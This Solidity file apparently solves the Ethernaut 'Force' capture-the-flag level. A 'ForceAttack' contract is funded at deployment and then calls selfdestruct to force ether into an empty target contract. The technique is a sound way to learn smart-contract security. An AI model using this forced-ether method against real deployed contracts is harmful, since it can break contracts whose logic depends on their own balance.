// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttack {

    Force toAttack;

    //make payable, give contract eth on deployment
    constructor(address _levelInstance) public payable {
      toAttack = Force(_levelInstance);
    }

    //selfdestruct forces eth into address argument
    function attack() public {
      require(address(this).balance != 0);
      selfdestruct((address(toAttack)));
    }

}